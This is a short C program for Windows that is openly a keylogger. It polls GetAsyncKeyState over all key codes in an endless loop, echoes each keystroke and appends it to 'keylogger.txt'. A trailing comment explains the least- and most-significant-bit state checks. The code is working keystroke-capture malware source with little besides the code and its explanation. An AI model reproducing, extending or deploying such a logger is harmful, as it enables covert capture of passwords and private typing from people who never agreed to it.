#include<stdio.h>
#include<windows.h>

void save_to_file(const char* filename, char message) {
    FILE* file = fopen(filename, "a");
    if(file == NULL) {
        printf("Error opening file\n");
        return;
    }
    fprintf(file, "%c", message);
    fclose(file);
}
int main() {
    char message;
    while(1){
        for(int i = 0; i < 256; i++) {
            if(GetAsyncKeyState(i) & 1){
                printf("%c", i);
                message = (char)(i); 
                save_to_file("keylogger.txt", message);                 
            }
        }
    }
}

/* 
            performing bitwise with LSB to know if the key was pressed since the last key press call. if you want to do perform bitwise with MSB, use (0x8000 hex) take every digit as 4 bits 8000 = 1000 0000 0000 0000
            you should not rely on bitwise with LSB because what if you call this function infrequently but user presses that button very much at that time it will be a problem because this function stores previous state and current state as well using 2bytes=16bits as data is represented in the form of bytes in systems both bytes store the state of keys. so if you frequently call this function states will be reset and every thing will be ok but if you don't call this function frequently then program might give unexpected results.
            as in this progarm perform bitwise operation with LSB was a great choice but in other cases it may not be so becarefull to use it.
*/